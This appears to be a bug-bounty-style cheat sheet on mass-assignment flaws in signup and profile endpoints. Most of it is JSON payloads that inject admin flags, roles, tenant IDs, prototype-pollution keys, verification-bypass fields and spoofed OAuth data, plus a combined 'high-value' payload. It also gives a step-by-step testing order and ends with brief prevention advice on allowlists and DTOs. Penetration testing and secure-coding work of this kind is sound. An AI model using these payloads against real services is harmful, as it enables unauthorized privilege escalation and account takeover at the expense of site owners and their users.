# : Mass-Assignment in Registration Flows
- Source: (Nov 24, 2025) — infosecwriteups.com
- Practical JSON payload variants for privilege escalation via hidden fields

## What is Mass-Assignment?
When backend automatically maps request fields to internal models without filtering, attackers can inject additional parameters to gain elevated privileges. Most frameworks deserialize JSON into objects automatically — if no strict allowlist, hidden fields like roles, admin flags, and org assignments can be overwritten.

## Practical JSON Payload Variants

### Boolean / Admin Flag Attempts
```json
{"email":"a@a.com","password":"Test123!","isAdmin":true}
{"email":"a@a.com","password":"Test123!","is_admin":true}
{"email":"a@a.com","password":"Test123!","admin":true}
{"email":"a@a.com","password":"Test123!","administrator":true}
{"email":"a@a.com","password":"Test123!","isAdmin":1}
{"email":"a@a.com","password":"Test123!","is_admin":"yes"}
```

### Role / Privilege Strings
```json
{"role":"admin","role_id":1,"role_name":"Administrator"}
{"user_type":"admin","account_type":"premium"}
{"permissions":"*","access_level":9999}
{"groups":["administrators","superusers"]}
```

### Organization / Tenant Variants
```json
{"org":"admin","org_id":1,"organization":"admin"}
{"tenant":"admin","tenant_id":1}
{"company":"target_corp","department":"IT"}
```

### Nested Objects / Prototype-Style
```json
{"profile":{"isAdmin":true,"role":"admin"}}
{"user":{"is_admin":true,"role_id":1}}
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

### Parameter Aliases
```json
{"isAdmin":true,"isadmin":true,"IS_ADMIN":true,"is-admin":true}
{"is_admin":true,"isAdmin":true,"admin":true}
```

### Verification / Timestamp Manipulation
```json
{"email":"a@a.com","email_verified":true,"isVerified":true}
{"email_verified_at":"2025-01-01T00:00:00Z","status":"active"}
{"email_confirmed":true,"confirmed_at":"2025-01-01"}
```

### Encoding / Content-Type Tricks
```json
{"email":"a@a.com","password":"Test123!","\u0069sAdmin":true}
{"email":"a@a.com","password":"Test123!","is\x00Admin":true}
```

### Workflow State Jumping
```json
{"skip_verification":true,"bypass_onboarding":true}
{"registration_step":"complete","status":"active"}
{"require_email_verification":false}
```

### OAuth / Provider Spoofing
```json
{"provider":"google","oauth_id":"attacker_oauth_id","skip_email_verification":true}
{"sso_data":{"email":"victim@company.com","role":"admin"}}
```

### Combination Payload (High-Value)
```json
{
  "email":"a@a.com",
  "password":"Test123!",
  "isAdmin":true,
  "role":"admin",
  "email_verified":true,
  "skip_verification":true,
  "org":"target_corp",
  "department":"IT",
  "bypass_onboarding":true
}
```

## Testing Strategy
1. Start with simple boolean/admin flags
2. Try all casing/alias variants
3. Test nested JSON structures
4. Try prototype pollution payloads
5. Check encoding/content-type bypasses
6. Combine multiple fields in single request
7. Always test on signup AND profile update endpoints
8. Check for mass-assignment in OAuth flows too

## Prevention
- Enforce strict allowlists of accepted fields
- Never use `...req.body` spread operator directly on models
- Validate each field explicitly server-side
- Use Data Transfer Objects (DTOs) with only expected properties
